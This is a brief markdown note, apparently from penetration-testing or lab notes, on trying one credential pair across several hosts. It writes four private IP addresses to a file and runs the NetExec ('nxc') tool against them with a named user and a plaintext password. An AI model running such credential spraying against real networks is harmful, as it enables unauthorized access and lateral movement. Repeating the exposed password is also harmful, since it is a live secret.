# Try  Credential Pair on different Hosts
## 1. define hosts
```
cat << EOF > hosts
172.16.119.13
172.16.119.7
172.16.119.10
172.16.119.11
EOF
```

try connecting

```
nxc <protocol> hosts -u hwilliam -p 'dealer-screwed-gym1'
```